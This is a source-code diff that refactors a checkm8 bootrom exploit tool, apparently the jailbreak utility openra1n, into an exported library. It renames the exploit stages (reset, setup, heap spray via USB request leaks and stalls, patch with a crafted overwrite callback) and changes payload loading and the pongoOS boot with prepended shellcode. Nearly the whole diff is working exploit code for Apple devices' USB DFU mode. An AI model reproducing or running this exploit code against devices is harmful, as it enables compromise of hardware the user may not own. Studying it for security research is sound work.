@@ -1,4 +1,6 @@
-#include <openra1n_usb.h>
+#include <openra1n_private.h>
+#include <openra1n.h>
+
 #include <common.h>
 
 #include <common/log.h>
@@ -6,17 +8,7 @@
 #include <lz4/lz4.h>
 #include <lz4/lz4hc.h>
 
-#include <payloads/s8000.bin.h>
-#include <payloads/s8001.bin.h>
-#include <payloads/s8003.bin.h>
-#include <payloads/t7000.bin.h>
-#include <payloads/t7001.bin.h>
-#include <payloads/t8010.bin.h>
-#include <payloads/t8011.bin.h>
-#include <payloads/t8012.bin.h>
-#include <payloads/t8015.bin.h>
-
-#include <payloads/Pongo.bin.h>
+#include <arpa/inet.h>
 #include <payloads/lz4dec.bin.h>
 
 #define ARM_16K_TT_L2_SHIFT      25                    /* page descriptor shift */
@@ -25,7 +17,7 @@ extern uint8_t payloads_s8000_bin[], payloads_s8001_bin[], payloads_s8003_bin[],
 extern unsigned payloads_s8000_bin_len, payloads_s8001_bin_len, payloads_s8003_bin_len, payloads_t7000_bin_len, payloads_t7001_bin_len, payloads_t8010_bin_len, payloads_t8011_bin_len, payloads_t8012_bin_len, payloads_t8015_bin_len;
 
 extern uint8_t payloads_Pongo_bin[], payloads_lz4dec_bin[];
-extern unsigned payloads_Pongo_bin_len, payloads_lz4dec_bin_len;
+extern unsigned pongo_bin_len, payloads_lz4dec_bin_len;
 
 static uint16_t cpid;
 static const char *pwnd_str = " YOLO:checkra1n";
@@ -34,11 +26,11 @@ static size_t config_hole, config_overwrite_pad;
 static uint64_t insecure_memory_base;
 static uint64_t func_gadget, write_prim, write_prim2, arm_clean_invalidate_dcache_line, arm_invalidate_icache, enter_critical_section, exit_critical_section, write_ttbr0, tlbi, TTBR0_PATCH_BASE, TTBR0_BASE, bootstrap_task_lr, payload_start_offset;
 
-static bool checkm8_check_usb_device(usb_handle_t *handle,
+int openra1n_check_usb_device(usb_handle_t *handle,
                          void *pwned)
 {
     char *usb_serial_num = get_usb_serial_number(handle);
-    bool ret = false;
+    int ret = 0;
     
     if(usb_serial_num != NULL)
     {
@@ -198,7 +190,7 @@ static bool checkm8_check_usb_device(usb_handle_t *handle,
         if(cpid != 0)
         {
             *(bool *)pwned = strstr(usb_serial_num, pwnd_str) != NULL;
-            ret = true;
+            ret = cpid;
         }
         free(usb_serial_num);
     }
@@ -255,7 +247,7 @@ static bool dfu_set_state_wait_reset(const usb_handle_t *handle)
     return false;
 }
 
-static bool checkm8_stage_reset(const usb_handle_t *handle)
+OPENRA1N_EXPORT bool openra1n_stage_reset(const usb_handle_t *handle)
 {
     transfer_ret_t transfer_ret;
     
@@ -282,7 +274,7 @@ static bool checkm8_stage_reset(const usb_handle_t *handle)
     return false;
 }
 
-static bool checkm8_stage_setup(const usb_handle_t *handle)
+OPENRA1N_EXPORT bool openra1n_stage_setup(const usb_handle_t *handle)
 {
     unsigned usb_abort_timeout = usb_timeout - 1;
     transfer_ret_t transfer_ret;
@@ -310,7 +302,7 @@ static bool checkm8_stage_setup(const usb_handle_t *handle)
     return false;
 }
 
-static bool checkm8_usb_request_leak(const usb_handle_t *handle)
+static bool openra1n_private_request_leak(const usb_handle_t *handle)
 {
     transfer_ret_t transfer_ret;
     
@@ -324,7 +316,7 @@ static bool checkm8_usb_request_leak(const usb_handle_t *handle)
     return false;
 }
 
-static void checkm8_stall(const usb_handle_t *handle)
+static void openra1n_stall(const usb_handle_t *handle)
 {
     unsigned usb_abort_timeout = usb_timeout - 1;
     transfer_ret_t transfer_ret;
@@ -335,7 +327,7 @@ static void checkm8_stall(const usb_handle_t *handle)
         {
             if(transfer_ret.sz < 3 * EP0_MAX_PACKET_SZ)
             {
-                if(checkm8_usb_request_leak(handle))
+                if(openra1n_private_request_leak(handle))
                 {
                     break;
                 }
@@ -345,7 +337,7 @@ static void checkm8_stall(const usb_handle_t *handle)
     }
 }
 
-static bool checkm8_no_leak(const usb_handle_t *handle)
+static bool openra1n_no_leak(const usb_handle_t *handle)
 {
     transfer_ret_t transfer_ret;
     
@@ -359,7 +351,7 @@ static bool checkm8_no_leak(const usb_handle_t *handle)
     return false;
 }
 
-static bool checkm8_usb_request_stall(const usb_handle_t *handle)
+static bool openra1n_private_request_stall(const usb_handle_t *handle)
 {
     transfer_ret_t transfer_ret;
     
@@ -373,22 +365,22 @@ static bool checkm8_usb_request_stall(const usb_handle_t *handle)
     return false;
 }
 
-static bool checkm8_stage_spray(const usb_handle_t *handle)
+OPENRA1N_EXPORT bool openra1n_stage_spray(const usb_handle_t *handle)
 {
     size_t i;
     
     if(cpid == 0x7001 || cpid == 0x7000 || cpid == 0x7002 || cpid == 0x8003 || cpid == 0x8000)
     {
-        while(!checkm8_usb_request_stall(handle) || !checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
+        while(!openra1n_private_request_stall(handle) || !openra1n_private_request_leak(handle) || !openra1n_no_leak(handle)) {}
     }
     else
     {
-        checkm8_stall(handle);
+        openra1n_stall(handle);
         for(i = 0; i < config_hole; ++i)
         {
-            while(!checkm8_no_leak(handle)) {}
+            while(!openra1n_no_leak(handle)) {}
         }
-        while(!checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
+        while(!openra1n_private_request_leak(handle) || !openra1n_no_leak(handle)) {}
     }
     
     send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 3 * EP0_MAX_PACKET_SZ + 1, NULL);
@@ -579,88 +571,25 @@ fail:
     return false;
 }
 
-static bool checkm8_stage_patch(const usb_handle_t *handle)
+OPENRA1N_EXPORT bool openra1n_stage_patch(const usb_handle_t *handle, void* checkra1n_payload, size_t checkra1n_payload_sz)
 {
     size_t i, data_sz, packet_sz;
     uint8_t *data;
     transfer_ret_t transfer_ret;
     bool ret = false;
-    
-    void* checkra1n_payload = NULL;
+
     void *overwrite = NULL;
-    size_t checkra1n_payload_sz = 0;
     size_t overwrite_sz = 0;
     
-    checkm8_overwrite_t checkm8_overwrite;
-    memset(&checkm8_overwrite, '\0', sizeof(checkm8_overwrite));
-    checkm8_overwrite.callback.next = insecure_memory_base;
-    overwrite = &checkm8_overwrite;
-    overwrite_sz = sizeof(checkm8_overwrite);
-    
-    switch (cpid)
-    {
-        case 0x8000:
-            LOG_DEBUG("setting up stage 2 for s8000");
-            checkra1n_payload    = payloads_s8000_bin;
-            checkra1n_payload_sz = payloads_s8000_bin_len;
-            break;
-            
-        case 0x8001:
-            LOG_DEBUG("setting up stage 2 for s8001");
-            checkra1n_payload    = payloads_s8001_bin;
-            checkra1n_payload_sz = payloads_s8001_bin_len;
-            break;
-            
-        case 0x8003:
-            LOG_DEBUG("setting up stage 2 for s8003");
-            checkra1n_payload    = payloads_s8003_bin;
-            checkra1n_payload_sz = payloads_s8003_bin_len;
-            break;
-            
-        case 0x7000:
-            LOG_DEBUG("setting up stage 2 for t7000");
-            checkra1n_payload    = payloads_t7000_bin;
-            checkra1n_payload_sz = payloads_t7000_bin_len;
-            break;
-            
-        case 0x7001:
-            LOG_DEBUG("setting up stage 2 for t7001");
-            checkra1n_payload    = payloads_t7001_bin;
-            checkra1n_payload_sz = payloads_t7001_bin_len;
-            break;
-            
-        case 0x8010:
-            LOG_DEBUG("setting up stage 2 for t8010");
-            checkra1n_payload    = payloads_t8010_bin;
-            checkra1n_payload_sz = payloads_t8010_bin_len;
-            break;
-            
-        case 0x8011:
-            LOG_DEBUG("setting up stage 2 for t8011");
-            checkra1n_payload    = payloads_t8011_bin;
-            checkra1n_payload_sz = payloads_t8011_bin_len;
-            break;
-            
-        case 0x8012:
-            LOG_DEBUG("setting up stage 2 for t8012");
-            checkra1n_payload    = payloads_t8012_bin;
-            checkra1n_payload_sz = payloads_t8012_bin_len;
-            break;
-            
-        case 0x8015:
-            LOG_DEBUG("setting up stage 2 for t8015");
-            checkra1n_payload    = payloads_t8015_bin;
-            checkra1n_payload_sz = payloads_t8015_bin_len;
-            break;
-            
-        default:
-            LOG_ERROR("unsupported cpid 0x%" PRIX32 "", cpid);
-            return false;
-    }
+    openra1n_overwrite_t openra1n_overwrite;
+    memset(&openra1n_overwrite, '\0', sizeof(openra1n_overwrite));
+    openra1n_overwrite.callback.next = insecure_memory_base;
+    overwrite = &openra1n_overwrite;
+    overwrite_sz = sizeof(openra1n_overwrite);
     
     if(generate_stage1((void *)&data, &data_sz, checkra1n_payload, checkra1n_payload_sz, cpid))
     {
-        if(checkm8_usb_request_stall(handle) && checkm8_usb_request_leak(handle))
+        if(openra1n_private_request_stall(handle) && openra1n_private_request_leak(handle))
         {
             LOG_DEBUG("successfully leaked data");
         }
@@ -700,14 +629,12 @@ static bool checkm8_stage_patch(const usb_handle_t *handle)
 }
 
 static void compress_pongo(void *out,
-                           size_t *out_len)
+                           size_t *out_len, void* in, size_t in_len)
 {
-    size_t len = payloads_Pongo_bin_len;
-    size_t out_len_ = *out_len;
-    *out_len = LZ4_compress_HC(payloads_Pongo_bin, out, len, out_len_, LZ4HC_CLEVEL_MAX);
+    *out_len = LZ4_compress_HC(in, out, in_len, *out_len, LZ4HC_CLEVEL_MAX);
 }
 
-bool checkm8_boot_pongo(usb_handle_t *handle)
+OPENRA1N_EXPORT bool openra1n_boot_pongo(usb_handle_t *handle, void* pongo_bin, unsigned int pongo_bin_len)
 {
     transfer_ret_t transfer_ret;
     LOG_INFO("Booting pongoOS");
@@ -715,10 +642,10 @@ bool checkm8_boot_pongo(usb_handle_t *handle)
     LOG_DEBUG("Appending shellcode to the top of pongoOS (512 bytes)");
     void *shellcode = malloc(512);
     memcpy(shellcode, payloads_lz4dec_bin, payloads_lz4dec_bin_len);
-    size_t out_len = payloads_Pongo_bin_len;
+    size_t out_len = pongo_bin_len;
     void *out = malloc(out_len);
-    compress_pongo(out, &out_len);
-    LOG_DEBUG("Compressed pongoOS from %u to %zu bytes", payloads_Pongo_bin_len, out_len);
+    compress_pongo(out, &out_len, pongo_bin, (size_t)pongo_bin_len);
+    LOG_DEBUG("Compressed pongoOS from %u to %zu bytes", pongo_bin_len, out_len);
     void *tmp = malloc(out_len + 512);
     memcpy(tmp, shellcode, 512);
     memcpy(tmp + 512, out, out_len);
@@ -728,13 +655,20 @@ bool checkm8_boot_pongo(usb_handle_t *handle)
     free(shellcode);
     LOG_DEBUG("Setting the compressed size into the shellcode");
     uint32_t* size = (uint32_t*)(out + 0x1fc);
-    LOG_DEBUG("size = 0x%" PRIX32 "", *size);
-    *size = out_len - 512;
-    LOG_DEBUG("size = 0x%" PRIX32 "", *size);
+    uint32_t compressed_size = out_len - 512;
+    if (htonl(compressed_size) == compressed_size) {
+        *size = ((compressed_size>>24)&0xff) |
+                    ((compressed_size<<8)&0xff0000) |
+                    ((compressed_size>>8)&0xff00) |
+                    ((compressed_size<<24)&0xff000000);
+    } else {
+        *size = compressed_size;
+    }
     LOG_DEBUG("Reconnecting to device");
-    init_usb_handle(handle, APPLE_VID, DFU_MODE_PID);
+    usb_handle_t* yolo_handle = openra1n_init_usb_handle(APPLE_VID, DFU_MODE_PID);
+    if (yolo_handle == NULL) return false;
     LOG_DEBUG("Waiting for device to be ready");
-    wait_usb_handle(handle, NULL, NULL);
+    openra1n_wait_usb_handle(yolo_handle, NULL);
     {
         size_t len = 0;
         size_t size;
@@ -742,11 +676,11 @@ bool checkm8_boot_pongo(usb_handle_t *handle)
         {
         retry:
             size = ((out_len - len) > 0x800) ? 0x800 : (out_len - len);
-            send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, (unsigned char*)&out[len], size, &transfer_ret);
+            send_usb_control_request(yolo_handle, 0x21, DFU_DNLOAD, 0, 0, (unsigned char*)&out[len], size, &transfer_ret);
             if(transfer_ret.ret == USB_TRANSFER_TIMEOUT)
             {
                 LOG_DEBUG("retrying at len = %zu", len);
-                sleep_ms(100);
+                openra1n_sleep_ms(100);
                 goto retry;
             }
             else if(transfer_ret.sz != size || transfer_ret.ret != USB_TRANSFER_OK)
@@ -758,66 +692,8 @@ bool checkm8_boot_pongo(usb_handle_t *handle)
             LOG_DEBUG("len = %zu", len);
         }
     }
-    send_usb_control_request_no_data(handle, 0x21, 4, 0, 0, 0, NULL);
+    send_usb_control_request_no_data(yolo_handle, 0x21, 4, 0, 0, 0, NULL);
     LOG_DEBUG("pongoOS sent, should be booting");
+    openra1n_free_handle(yolo_handle);
     return true;
-}
-
-bool checkm8(usb_handle_t *handle)
-{
-    enum
-    {
-        STAGE_RESET,
-        STAGE_SETUP,
-        STAGE_SPRAY,
-        STAGE_PATCH,
-        STAGE_PWNED
-    } stage = STAGE_RESET;
-    bool ret, pwned;
-    
-    init_usb_handle(handle, APPLE_VID, DFU_MODE_PID);
-    while(stage != STAGE_PWNED && wait_usb_handle(handle, checkm8_check_usb_device, &pwned))
-    {
-        if(!pwned)
-        {
-            if(stage == STAGE_RESET)
-            {
-                ret = checkm8_stage_reset(handle);
-                stage = STAGE_SETUP;
-            }
-            else if(stage == STAGE_SETUP)
-            {
-                LOG_INFO("Setting up the exploit (this is the heap spray)");
-                ret = checkm8_stage_setup(handle);
-                stage = STAGE_SPRAY;
-            }
-            else if(stage == STAGE_SPRAY)
-            {
-                ret = checkm8_stage_spray(handle);
-                stage = STAGE_PATCH;
-            }
-            else
-            {
-                LOG_INFO("Right before trigger (this is the real bug setup)");
-                ret = checkm8_stage_patch(handle);
-                stage = STAGE_RESET;
-            }
-            if(ret)
-            {
-                LOG_DEBUG("Stage %d succeeded", stage);
-            }
-            else
-            {
-                LOG_ERROR("Stage %d failed", stage);
-                stage = STAGE_RESET;
-            }
-            reset_usb_handle(handle);
-        }
-        else
-        {
-            stage = STAGE_PWNED;
-        }
-        close_usb_handle(handle);
-    }
-    return stage == STAGE_PWNED;
 }
